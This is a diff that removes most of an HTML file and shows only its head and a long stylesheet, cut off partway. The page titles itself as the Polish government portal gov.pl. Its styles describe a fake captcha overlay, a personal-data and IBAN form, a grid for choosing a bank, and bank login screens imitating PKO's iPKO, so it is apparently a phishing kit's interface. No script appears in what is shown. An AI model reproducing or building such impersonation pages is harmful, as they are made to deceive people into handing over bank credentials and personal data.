@@ -1,3948 +1,558 @@
-<!DOCTYPE html>
-<html lang="pl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="theme-color" content="#ffffff">
-    
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
-    
-    <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background-color: #f5f7fb;
-            color: #1a1a1a;
-            line-height: 1.6;
-            overflow-x: hidden;
-            scroll-behavior: smooth;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        /* ===== CAPTCHA OVERLAY — FULLSCREEN ===== */
-        #captchaOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            transition: opacity 0.6s ease, visibility 0.6s ease;
-            opacity: 1;
-            visibility: visible;
-        }
-
-        #captchaOverlay.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-
-        .captcha-box {
-            background: #ffffff;
-            border-radius: 20px;
-            padding: 48px 40px 40px;
-            max-width: 420px;
-            width: 92%;
-            text-align: center;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
-            animation: captchaSlideIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        @keyframes captchaSlideIn {
-            from {
-                transform: translateY(40px) scale(0.92);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0) scale(1);
-                opacity: 1;
-            }
-        }
-
-        .captcha-box .captcha-icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-            display: block;
-        }
-
-        .captcha-box h2 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-        }
-
-        .captcha-box p {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 24px;
-        }
-
-        .captcha-box .captcha-question {
-            font-size: 36px;
-            font-weight: 800;
-            color: #003b6f;
-            background: #f0f4fa;
-            padding: 18px 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            letter-spacing: 12px;
-            font-family: 'Courier New', monospace;
-            user-select: none;
-            border: 2px dashed #d0d8e4;
-        }
-
-        .captcha-box input {
-            width: 100%;
-            padding: 14px 18px;
-            font-size: 20px;
-            border: 2px solid #d0d8e4;
-            border-radius: 10px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            text-align: center;
-            letter-spacing: 8px;
-            background: #fafcff;
-        }
-
-        .captcha-box input:focus {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 4px rgba(0, 59, 111, 0.12);
-            background: #ffffff;
-        }
-
-        .captcha-box input.error {
-            border-color: #cc0000;
-            background: #fff5f5;
-        }
-
-        .captcha-box .captcha-btn {
-            width: 100%;
-            padding: 15px;
-            margin-top: 16px;
-            background: #003b6f;
-            color: #ffffff;
-            border: none;
-            border-radius: 10px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.15s;
-        }
-
-        .captcha-box .captcha-btn:hover {
-            background: #002a4f;
-        }
-
-        .captcha-box .captcha-btn:active {
-            transform: scale(0.97);
-        }
-
-        .captcha-box .captcha-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .captcha-box .captcha-error {
-            color: #cc0000;
-            font-size: 14px;
-            min-height: 24px;
-            font-weight: 500;
-        }
-
-        .captcha-box .captcha-refresh {
-            display: inline-block;
-            margin-top: 14px;
-            color: #003b6f;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            text-decoration: underline;
-            background: none;
-            border: none;
-            transition: color 0.2s;
-            padding: 4px 8px;
-        }
-
-        .captcha-box .captcha-refresh:hover {
-            color: #001f3f;
-        }
-
-        /* ===== HEADER ===== */
-        .header {
-            background: #ffffff;
-            width: 100%;
-            height: 72px;
-            border-bottom: 2px solid #e6ebf3;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1001;
-            transition: all 0.3s;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            transition: all 0.3s;
-            overflow: hidden;
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-right: 15px;
-            transition: all 0.3s;
-            overflow: hidden;
-        }
-
-        .menu-btn {
-            width: 70px;
-            height: 70px;
-            background: transparent;
-            border: none;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            cursor: pointer;
-            transition: background 0.2s;
-            flex-shrink: 0;
-            margin-right: 12px;
-            padding: 0;
-            z-index: 1002;
-        }
-
-        .menu-btn:hover {
-            background: rgba(0, 0, 0, 0.03);
-        }
-
-        .menu-btn .line {
-            display: block;
-            width: 30px;
-            height: 3px;
-            background: #888;
-            border-radius: 2px;
-            transition: all 0.2s;
-            flex-shrink: 0;
-        }
-
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-            transition: all 0.3s;
-        }
-
-        .logo-area .coat-of-arms {
-            height: 40px;
-            width: auto;
-            display: block;
-            flex-shrink: 0;
-        }
-
-        .logo-area .logo-main {
-            display: flex;
-            align-items: baseline;
-            gap: 8px;
-        }
-
-        .logo-area .logo-main .gov {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a1a;
-            letter-spacing: -0.5px;
-        }
-
-        .logo-area .logo-main .separator {
-            font-size: 26px;
-            font-weight: 600;
-            color: #cc0000;
-            line-height: 1;
-        }
-
-        .logo-area .logo-main .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            color: #555;
-        }
-
-        .header-search {
-            display: flex;
-            align-items: center;
-            background: #f0f4fa;
-            border: 1px solid #d0d8e4;
-            overflow: hidden;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            height: 44px;
-            border-radius: 4px;
-            min-width: 340px;
-        }
-
-        .header-search:focus-within {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.15);
-        }
-
-        .header-search .search-icon-btn {
-            background: transparent;
-            border: none;
-            padding: 0 12px 0 14px;
-            height: 100%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-
-        .header-search .search-icon-btn svg {
-            width: 18px;
-            height: 18px;
-            fill: none;
-            stroke: #555;
-            stroke-width: 2.5;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            transition: stroke 0.2s;
-        }
-
-        .header-search .search-icon-btn:hover svg {
-            stroke: #003b6f;
-        }
-
-        .header-search input {
-            border: none;
-            outline: none;
-            padding: 0 12px 0 0;
-            font-size: 14px;
-            background: transparent;
-            color: #1a1a1a;
-            min-width: 180px;
-            height: 100%;
-            flex: 1;
-        }
-
-        .header-search input::placeholder {
-            color: #777;
-            font-weight: 400;
-        }
-
-        .header-search .search-submit-btn {
-            background: #003b6f;
-            border: none;
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 600;
-            padding: 0 22px;
-            height: 100%;
-            cursor: pointer;
-            transition: background 0.2s;
-            white-space: nowrap;
-            border-radius: 0 4px 4px 0;
-            flex-shrink: 0;
-        }
-
-        .header-search .search-submit-btn:hover {
-            background: #002a4f;
-        }
-
-        .header-eu-logo {
-            width: 72px;
-            height: 44px;
-            flex-shrink: 0;
-            display: block;
-        }
-
-        .header-eu-logo img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .main-wrapper {
-            display: flex;
-            gap: 0;
-            align-items: flex-start;
-            padding: 0;
-            width: 100%;
-            margin-top: 72px;
-            transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            position: relative;
-            z-index: 1;
-        }
-
-        .main-wrapper.shifted {
-            margin-left: 100px;
-        }
-
-        .sidebar {
-            min-width: 268px;
-            max-width: 268px;
-            background: #ffffff;
-            border-right: 1px solid #e6ebf3;
-            padding: 16px 0;
-            height: calc(100vh - 72px);
-            overflow-y: auto;
-            position: fixed;
-            top: 72px;
-            left: -268px;
-            z-index: 1000;
-            transition: left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            box-shadow: 4px 0 20px rgba(0, 0, 0, 0.05);
-        }
-
-        .sidebar.open {
-            left: 0;
-        }
-
-        .sidebar::-webkit-scrollbar {
-            width: 4px;
-        }
-
-        .sidebar::-webkit-scrollbar-track {
-            background: #f0f0f0;
-        }
-
-        .sidebar::-webkit-scrollbar-thumb {
-            background: #c0c8d4;
-            border-radius: 4px;
-        }
-
-        .sidebar-nav ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .sidebar-nav ul li a {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 9px 20px;
-            color: #1a1a1a;
-            font-size: 16px;
-            font-weight: 400;
-            border-bottom: 1px solid #f0f2f5;
-            transition: background 0.2s, color 0.2s;
-            text-decoration: none;
-        }
-
-        .sidebar-nav ul li a:hover {
-            background: #eef4fc;
-            color: #4a7ba7;
-        }
-
-        .sidebar-nav ul li a.active {
-            background: #4a7ba7;
-            color: #ffffff;
-            font-weight: 400;
-        }
-
-        .sidebar-nav ul li a.active:hover {
-            background: #3a6a94;
-            color: #ffffff;
-        }
-
-        .sidebar-nav ul li a .menu-icon {
-            width: 20px;
-            height: 22px;
-            flex-shrink: 0;
-            display: block;
-        }
-
-        .sidebar-nav ul li a .menu-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .sidebar-nav .separator {
-            border-bottom: 1px solid #bcc3cd;
-            margin: 6px 16px;
-            padding: 0;
-        }
-
-        .sidebar-nav .separator:last-of-type {
-            display: none;
-        }
-
-        .sidebar-nav .ukraine-link {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 9px 20px;
-            color: #1a1a1a;
-            font-size: 13px;
-            font-weight: 400;
-            border-bottom: none;
-            transition: background 0.2s, color 0.2s;
-            text-decoration: none;
-            line-height: 1.3;
-        }
-
-        .sidebar-nav .ukraine-link:hover {
-            background: #eef4fc;
-            color: #4a7ba7;
-        }
-
-        .sidebar-nav .ukraine-link .flag-icon {
-            width: 24px;
-            height: 16px;
-            flex-shrink: 0;
-            display: block;
-        }
-
-        .sidebar-nav .ukraine-link .flag-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .content-wrapper {
-            flex: 1;
-            min-width: 0;
-            transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-        }
-
-        .content-wrapper.shifted {
-            margin-left: 100px;
-        }
-
-        .login-nav {
-            width: 100%;
-            background: #ffffff;
-            border-bottom: 1px solid #e6ebf3;
-            padding: 10px 30px;
-            display: flex;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 40px 20px;
-            transition: opacity 0.3s, max-height 0.3s;
-            overflow: hidden;
-            max-height: 200px;
-            opacity: 1;
-        }
-
-        .login-nav.hidden {
-            max-height: 0;
-            opacity: 0;
-            padding: 0 30px;
-            border-bottom: none;
-            margin: 0;
-        }
-
-        .login-nav .brand {
-            font-size: 20px;
-            font-weight: 700;
-            color: #000000;
-            letter-spacing: -0.3px;
-            white-space: nowrap;
-            margin-left: 450px;
-        }
-
-        .login-nav .nav-links {
-            display: flex;
-            align-items: center;
-            gap: 24px;
-            flex-wrap: wrap;
-            margin-left: 40px;
-        }
-
-        .login-nav .nav-links a {
-            font-size: 15px;
-            font-weight: 500;
-            color: #1a1a1a;
-            transition: color 0.2s;
-            white-space: nowrap;
-        }
-
-        .login-nav .nav-links a:hover {
-            color: #003b6f;
-            text-decoration: underline;
-        }
-
-        .image-under-banner {
-            width: 100%;
-            padding: 12px 0;
-            background: #ffffff;
-            border-bottom: 1px solid #e6ebf3;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            transition: opacity 0.3s, max-height 0.3s;
-            overflow: hidden;
-            max-height: 800px;
-            opacity: 1;
-        }
-
-        .image-under-banner.hidden {
-            max-height: 0;
-            opacity: 0;
-            padding: 0;
-            border-bottom: none;
-            margin: 0;
-        }
-
-        .image-under-banner .image-wrapper {
-            position: relative;
-            display: inline-block;
-            max-width: 100%;
-        }
-
-        .image-under-banner .image-wrapper img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .image-under-banner .image-wrapper .overlay-icon {
-            position: absolute;
-            top: 50%;
-            left: 400px;
-            transform: translateY(-50%);
-            width: 176px;
-            height: 145px;
-            opacity: 0.9;
-            pointer-events: none;
-        }
-
-        .image-under-banner .image-wrapper .overlay-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .image-under-banner .image-wrapper .overlay-line {
-            position: absolute;
-            top: 10%;
-            bottom: 10%;
-            left: 600px;
-            width: 2px;
-            background: linear-gradient(to bottom, #888888, #222222, #888888);
-            opacity: 0.5;
-            pointer-events: none;
-            border-radius: 2px;
-        }
-
-        .image-under-banner .image-wrapper .overlay-text {
-            position: absolute;
-            top: 50%;
-            left: 630px;
-            transform: translateY(-50%);
-            pointer-events: none;
-            max-width: 420px;
-        }
-
-        .image-under-banner .image-wrapper .overlay-text h2 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-            line-height: 1.2;
-        }
-
-        .image-under-banner .image-wrapper .overlay-text p {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 16px;
-            line-height: 1.5;
-        }
-
-        .image-under-banner .image-wrapper .overlay-text .btn-outline {
-            display: inline-block;
-            padding: 10px 28px;
-            border: 2px solid #1a1a1a;
-            color: #1a1a1a;
-            font-size: 14px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-radius: 4px;
-            transition: background 0.2s, color 0.2s;
-            pointer-events: auto;
-            cursor: pointer;
-            background: transparent;
-        }
-
-        .image-under-banner .image-wrapper .overlay-text .btn-outline:hover {
-            background: #1a1a1a;
-            color: #ffffff;
-        }
-
-        .iban-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        .iban-wrapper:focus-within {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
-            background: #ffffff;
-        }
-
-        .iban-wrapper .pl-prefix {
-            padding: 0 0 0 14px;
-            font-size: 14px;
-            font-weight: 600;
-            color: transparent !important;
-            pointer-events: none;
-            user-select: none;
-            flex-shrink: 0;
-            background: transparent;
-            line-height: 1;
-            opacity: 0 !important;
-            visibility: visible !important;
-            width: 18px;
-            display: inline-block;
-            text-indent: 0;
-        }
-
-        .iban-wrapper input {
-            border: none !important;
-            outline: none !important;
-            padding: 10px 14px 10px 2px !important;
-            font-size: 14px !important;
-            background: transparent !important;
-            color: #1a1a1a !important;
-            flex: 1;
-            min-width: 0;
-            box-shadow: none !important;
-            border-radius: 0 !important;
-            font-family: inherit;
-        }
-
-        .iban-wrapper input::placeholder {
-            color: #999;
-        }
-
-        .iban-wrapper input.error {
-            color: #cc0000 !important;
-        }
-
-        .iban-wrapper.error {
-            border-color: #cc0000 !important;
-            background: #fff5f5 !important;
-        }
-
-        .data-form-section {
-            background: #ffffff;
-            padding: 30px 40px 40px;
-            border-bottom: 1px solid #e6ebf3;
-            scroll-margin-top: 80px;
-            display: block;
-            transition: opacity 0.3s, max-height 0.3s;
-            overflow: hidden;
-            max-height: 2000px;
-            opacity: 1;
-        }
-
-        .data-form-section.hidden {
-            max-height: 0;
-            opacity: 0;
-            padding: 0 40px;
-            border-bottom: none;
-            margin: 0;
-        }
-
-        .data-form-section .section-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #003b6f;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #e6ebf3;
-            padding-bottom: 12px;
-        }
-
-        .blue-alert {
-            background: #e8f0fe;
-            border-left: 4px solid #003b6f;
-            padding: 20px 24px;
-            margin-bottom: 24px;
-            border-radius: 4px;
-            color: #003b6f;
-            font-size: 18px;
-            line-height: 1.6;
-        }
-
-        .blue-alert strong {
-            color: #002a4f;
-        }
-
-        .blue-alert .alert-icon {
-            font-size: 22px;
-            margin-right: 12px;
-        }
-
-        .data-form {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 18px 30px;
-        }
-
-        .data-form .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .data-form .form-group.full-width {
-            grid-column: 1 / -1;
-        }
-
-        .data-form .form-group label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .data-form .form-group label .required {
-            color: #cc0000;
-            margin-left: 2px;
-        }
-
-        .data-form .form-group input,
-        .data-form .form-group select {
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-        }
-
-        .data-form .form-group input:focus,
-        .data-form .form-group select:focus {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
-            outline: none;
-            background: #ffffff;
-        }
-
-        .data-form .form-group input::placeholder {
-            color: #999;
-        }
-
-        .data-form .form-group input.error {
-            border-color: #cc0000;
-            background: #fff5f5;
-        }
-
-        .data-form .address-row {
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 10px;
-        }
-
-        .data-form .address-row input {
-            width: 100%;
-        }
-
-        .data-form .form-actions {
-            grid-column: 1 / -1;
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 6px;
-        }
-
-        .data-form .submit-btn {
-            background: #003b6f;
-            color: #ffffff;
-            border: none;
-            padding: 12px 40px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .data-form .submit-btn:hover {
-            background: #002a4f;
-        }
-
-        .data-form .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .data-form .submit-btn .spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #ffffff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 10px;
-        }
-
-        .data-form .submit-btn.loading .spinner {
-            display: inline-block;
-        }
-
-        .bank-selection {
-            display: none;
-            background: #ffffff;
-            padding: 60px 40px 20px;
-            min-height: calc(100vh - 72px);
-            width: 100%;
-            position: relative;
-            z-index: 2;
-        }
-
-        .bank-selection.visible {
-            display: block;
-        }
-
-        .bank-selection .bank-title {
-            font-size: 32px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .bank-selection .bank-subtitle {
-            font-size: 18px;
-            color: #555;
-            margin-bottom: 40px;
-        }
-
-        .bank-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            max-width: 660px;
-        }
-
-        .bank-btn {
-            width: 191px;
-            height: 80px;
-            min-width: 191px;
-            min-height: 80px;
-            max-width: 191px;
-            max-height: 80px;
-            border: 2px solid #003b6f;
-            border-radius: 8px;
-            background: #ffffff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
-            padding: 14px;
-            -webkit-tap-highlight-color: transparent;
-            flex-shrink: 0;
-        }
-
-        .bank-btn:hover {
-            border-color: #002a4f;
-            box-shadow: 0 4px 16px rgba(0, 59, 111, 0.15);
-            transform: scale(1.02);
-        }
-
-        .bank-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank-btn img {
-            width: 162px;
-            height: 52px;
-            object-fit: contain;
-            display: block;
-        }
-
-        .bank-btn img[alt="Bank 2"] {
-            width: 161px;
-            height: 52px;
-        }
-
-        .bank-btn-centered {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            padding: 8px 4px;
-            width: 191px;
-            height: 80px;
-            min-width: 191px;
-            min-height: 80px;
-            max-width: 191px;
-            max-height: 80px;
-            border: 2px solid #003b6f;
-            border-radius: 8px;
-            background: #ffffff;
-            cursor: pointer;
-            transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
-            box-sizing: border-box;
-        }
-
-        .bank-btn-centered:hover {
-            border-color: #002a4f;
-            box-shadow: 0 4px 16px rgba(0, 59, 111, 0.15);
-            transform: scale(1.02);
-        }
-
-        .bank-btn-centered:active {
-            transform: scale(0.97);
-        }
-
-        .bank-inner {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            height: 100%;
-            gap: 2px;
-        }
-
-        .bank-logo-inner {
-            width: auto;
-            max-width: 80%;
-            max-height: 55%;
-            object-fit: contain;
-            display: block;
-            flex-shrink: 0;
-        }
-
-        .bank-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #1a1a1a;
-            text-align: center;
-            line-height: 1.2;
-            letter-spacing: 0.3px;
-            margin-top: 2px;
-            white-space: nowrap;
-        }
-
-        .bank10-container-centered {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        .bank10-logo-center {
-            margin-bottom: 24px;
-            display: flex;
-            justify-content: center;
-            width: 100%;
-        }
-
-        .bank10-logo-img {
-            max-width: 180px;
-            height: auto;
-            display: block;
-        }
-
-        .bank10-card-centered {
-            background: #ffffff;
-            border: 1px solid #d0d8e4;
-            border-radius: 12px;
-            padding: 30px 28px 28px;
-            width: 100%;
-            max-width: 440px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
-            text-align: center;
-        }
-
-        .bank10-card-centered .bank10-login-title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 20px;
-        }
-
-        .bank10-form-centered {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-
-        .bank10-form-centered .form-group {
-            width: 100%;
-            max-width: 360px;
-            margin-bottom: 16px;
-            text-align: left;
-        }
-
-        .bank10-form-centered label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-            text-align: left;
-        }
-
-        .bank10-form-centered input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 6px;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-            text-align: left;
-        }
-
-        .bank10-form-centered input:focus {
-            border-color: #0f4bb5;
-            box-shadow: 0 0 0 3px rgba(15, 75, 181, 0.12);
-            outline: none;
-        }
-
-        .bank10-form-centered input::placeholder {
-            color: #999;
-        }
-
-        .bank10-form-centered .login-btn {
-            width: 100%;
-            max-width: 360px;
-            padding: 14px;
-            background: #0f4bb5;
-            color: #ffffff;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 4px;
-        }
-
-        .bank10-form-centered .login-btn:hover {
-            background: #0d3f99;
-        }
-
-        .bank10-form-centered .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank10-security-centered {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e6ebf3;
-            width: 100%;
-            max-width: 440px;
-            text-align: center;
-        }
-
-        .bank10-security-centered .bank10-security-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-
-        .bank10-security-centered .bank10-security-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            text-align: left;
-            display: inline-block;
-        }
-
-        .bank10-security-centered .bank10-security-list li {
-            font-size: 14px;
-            color: #444;
-            padding: 4px 0 4px 24px;
-            position: relative;
-            line-height: 1.5;
-        }
-
-        .bank10-security-centered .bank10-security-list li::before {
-            content: '•';
-            position: absolute;
-            left: 0;
-            color: #0f4bb5;
-            font-weight: 700;
-        }
-
-        .bank-footer {
-            display: none;
-            width: 100%;
-            padding: 60px 0 30px;
-            background: #ffffff;
-            border-top: 1px solid #e6ebf3;
-            text-align: center;
-        }
-
-        .bank-footer.visible {
-            display: block;
-        }
-
-        .bank-footer .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-        }
-
-        .bank-footer .footer-links a {
-            font-size: 13px;
-            color: #999;
-            transition: color 0.2s;
-        }
-
-        .bank-footer .footer-links a:hover {
-            color: #555;
-            text-decoration: underline;
-        }
-
-        .login-screen {
-            display: none;
-            background: #ffffff;
-            min-height: calc(100vh - 72px);
-            width: 100%;
-            padding: 40px 30px 30px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .login-screen.visible {
-            display: block;
-        }
-
-        .login-screen .login-container {
-            max-width: 1000px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .login-screen .login-grid {
-            display: flex;
-            gap: 60px;
-            align-items: flex-start;
-            width: 100%;
-        }
-
-        .login-screen .login-left {
-            flex: 1;
-            max-width: 480px;
-        }
-
-        .login-screen .login-right {
-            flex: 1;
-            max-width: 400px;
-            padding-top: 10px;
-        }
-
-        .login-screen .login-left .ipko-logo {
-            width: 75px;
-            height: 56px;
-            display: block;
-            margin-bottom: 12px;
-        }
-
-        .login-screen .login-left .ipko-logo img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .login-screen .login-title {
-            font-size: 28px;
-            font-weight: 400;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .login-screen .login-subtitle {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 24px;
-        }
-
-        .login-screen .login-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .login-screen .login-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .login-screen .login-form input {
-            width: 100%;
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-        }
-
-        .login-screen .login-form input:focus {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
-            outline: none;
-            background: #ffffff;
-        }
-
-        .login-screen .login-form .login-btn {
-            width: 135px;
-            height: 40px;
-            padding: 0 20px;
-            background: #0072b0;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            flex-shrink: 0;
-            white-space: nowrap;
-            margin-top: 6px;
-        }
-
-        .login-screen .login-form .login-btn:hover {
-            background: #005a8c;
-        }
-
-        .login-screen .login-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .login-screen .login-form .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .login-screen .login-form .login-btn-row .form-group {
-            flex: 1;
-            min-width: 180px;
-            margin-bottom: 0;
-        }
-
-        .login-screen .security-info {
-            border-left: 3px solid #003b6f;
-            padding-left: 28px;
-            height: 100%;
-        }
-
-        .login-screen .security-info .info-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-
-        .login-screen .security-info p {
-            font-size: 15px;
-            color: #444;
-            margin-bottom: 8px;
-            line-height: 1.5;
-        }
-
-        .login-screen .security-info .highlight {
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-
-        .login-screen .security-info .security-block {
-            margin-bottom: 16px;
-        }
-
-        .login-screen .security-info .security-block:last-child {
-            margin-bottom: 0;
-        }
-
-        .login-screen .contact-info {
-            border-left: 3px solid #0072b0;
-            padding-left: 28px;
-            height: 100%;
-        }
-
-        .login-screen .contact-info .info-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 16px;
-        }
-
-        .login-screen .contact-info .contact-block {
-            margin-bottom: 18px;
-        }
-
-        .login-screen .contact-info .contact-block:last-child {
-            margin-bottom: 0;
-        }
-
-        .login-screen .contact-info .contact-label {
-            font-weight: 600;
-            color: #1a1a1a;
-            font-size: 15px;
-            margin-bottom: 2px;
-        }
-
-        .login-screen .contact-info .contact-phone {
-            font-size: 18px;
-            font-weight: 700;
-            color: #0072b0;
-            letter-spacing: 0.5px;
-        }
-
-        .login-screen .contact-info .contact-phone-small {
-            font-size: 15px;
-            font-weight: 400;
